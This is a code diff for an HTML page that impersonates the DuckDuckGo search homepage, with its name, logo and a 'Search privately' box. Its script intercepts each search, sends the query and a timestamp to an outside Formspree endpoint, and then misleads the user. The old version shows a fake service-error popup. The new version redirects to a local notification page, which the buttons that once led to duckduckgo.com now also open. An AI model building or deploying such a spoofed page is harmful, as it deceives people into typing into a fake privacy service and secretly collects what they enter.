@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
     <title>DuckDuckGo</title>
     <style>
-        /* ---------- Original styles (unchanged) ---------- */
+        /* ---------- STYLES (unchanged) ---------- */
         * {
             margin: 0;
             padding: 0;
@@ -264,53 +264,6 @@
                 font-size: 0.75rem;
             }
         }
-
-        /* ---------- Custom modal styles (unchanged) ---------- */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.5);
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background: white;
-            padding: 24px 28px;
-            border-radius: 16px;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 20px 30px rgba(0,0,0,0.2);
-            margin: 0 16px;
-        }
-        .modal-content p {
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            color: #222;
-            line-height: 1.5;
-        }
-        .modal-content button {
-            background: #de5833;
-            border: none;
-            color: white;
-            font-size: 1.1rem;
-            padding: 10px 30px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-weight: 500;
-            transition: background 0.2s;
-            border: 1px solid #c04a2a;
-        }
-        .modal-content button:hover {
-            background: #c04a2a;
-        }
-        .modal-content button:active {
-            transform: scale(0.97);
-        }
     </style>
 </head>
 <body>
@@ -319,17 +272,17 @@
             <img src="https://i.imgur.com/mf7F3Oe.png" alt="DuckDuckGo">
         </div>
 
-        <!-- Two pill buttons - now point to duckduckgo.com -->
+        <!-- Two pill buttons - open notification.html in a new tab (no Formspree) -->
         <div class="pill-buttons">
-            <a href="https://duckduckgo.com" class="pill-button" target="_blank" rel="noopener noreferrer">
+            <a href="notification.html" class="pill-button" target="_blank" rel="noopener noreferrer">
                 <span class="emoji">🦆</span> Search
             </a>
-            <a href="https://duckduckgo.com" class="pill-button" target="_blank" rel="noopener noreferrer">
+            <a href="notification.html" class="pill-button" target="_blank" rel="noopener noreferrer">
                 Duck.ai
             </a>
         </div>
 
-        <!-- Search form - sends data to Formspree, then shows popup immediately -->
+        <!-- Search form - intercepted by JavaScript, sent to Formspree, then redirect to notification.html -->
         <form class="search-form" id="searchForm">
             <div class="search-container">
                 <input type="text" name="q" placeholder="Search privately" autofocus>
@@ -348,67 +301,46 @@
         </div>
     </div>
 
-    <!-- Popup modal (hidden by default) -->
-    <div id="errorModal" class="modal">
-        <div class="modal-content">
-            <p>this service can't be completed at this moment. Please try again after 1 hour. Thank you.</p>
-            <button id="closeModalBtn">Close</button>
-        </div>
-    </div>
-
     <script>
         window.addEventListener('load', function() {
-            const inputField = document.querySelector('input[name="q"]');
-            inputField.focus();
+            // Keep autofocus on the input
+            document.querySelector('input[name="q"]').focus();
 
             const form = document.getElementById('searchForm');
-            const modal = document.getElementById('errorModal');
-            const closeBtn = document.getElementById('closeModalBtn');
-
-            // Formspree endpoint (active)
             const formspreeEndpoint = 'https://formspree.io/f/xovlrdob';
 
-            let timeoutId = null;
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
 
-            // Close modal when clicking the close button
-            closeBtn.addEventListener('click', function() {
-                modal.style.display = 'none';
-            });
+                const query = document.querySelector('input[name="q"]').value.trim();
+                if (!query) return; // ignore empty search
 
-            // Close modal if user clicks outside the content
-            modal.addEventListener('click', function(e) {
-                if (e.target === modal) {
-                    modal.style.display = 'none';
-                }
-            });
-
-            form.addEventListener('submit', function(event) {
-                event.preventDefault();           // Stop page reload
-
-                const query = inputField.value.trim();
-
-                // 1. Send the query to Formspree (fire and forget)
+                // Prepare data for Formspree
                 const formData = new FormData();
                 formData.append('query', query);
                 formData.append('_subject', 'New DuckDuckGo Search');
                 formData.append('timestamp', new Date().toLocaleString());
 
-                fetch(formspreeEndpoint, {
-                    method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' }
-                }).catch(err => console.error('Formspree error:', err));
+                console.log('Intercepted query:', query);
 
-                // 2. Clear any previous timer
-                if (timeoutId) {
-                    clearTimeout(timeoutId);
+                try {
+                    const response = await fetch(formspreeEndpoint, {
+                        method: 'POST',
+                        body: formData,
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (response.ok) {
+                        // Success: redirect to notification.html (same tab) with the query
+                        window.location.href = 'notification.html?q=' + encodeURIComponent(query);
+                    } else {
+                        const errorData = await response.json();
+                        alert('Submission failed: ' + (errorData.error || 'Unknown error'));
+                    }
+                } catch (error) {
+                    console.error('Fetch error:', error);
+                    alert('Network error – please check your connection and try again.');
                 }
-
-                // 3. Show popup immediately (0 delay)
-                timeoutId = setTimeout(function() {
-                    modal.style.display = 'flex';  // Show the modal
-                    timeoutId = null;
-                }, 0); // 0 ms = as soon as possible (immediate)
             });
         });
     </script>
